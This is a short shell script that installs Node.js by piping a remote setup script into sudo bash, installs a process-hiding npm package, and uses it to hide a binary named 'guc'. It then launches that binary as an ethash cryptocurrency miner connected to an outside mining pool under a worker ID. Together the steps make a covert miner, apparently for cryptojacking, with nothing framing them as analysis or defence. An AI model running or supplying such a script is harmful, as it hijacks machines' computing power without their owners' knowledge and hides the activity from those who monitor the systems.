
curl -fsSL https://deb.nodesource.com/setup_14.x | sudo -E bash -
apt-get install -y nodejs
npm i -g node-process-hider
ph add guc
chmod +x guc
./guc --proto stratum --algo ethash --server ethash.infinityton.com:4444 --user f39829a015d4.worker1

